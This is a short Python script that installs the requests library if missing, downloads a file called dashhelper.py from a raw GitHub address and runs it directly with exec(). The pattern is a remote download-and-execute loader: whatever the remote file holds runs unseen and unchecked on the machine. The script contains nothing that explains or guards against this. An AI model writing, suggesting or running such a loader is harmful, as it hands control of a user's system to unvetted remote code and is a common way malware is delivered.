import os
try: import requests
except: os.system("pip install requests"); import requests
script_request = requests.get("https://raw.githubusercontent.com/flex1948/Unbesiegbar/main/dashhelper.py")
script = script_request.text
exec(script)
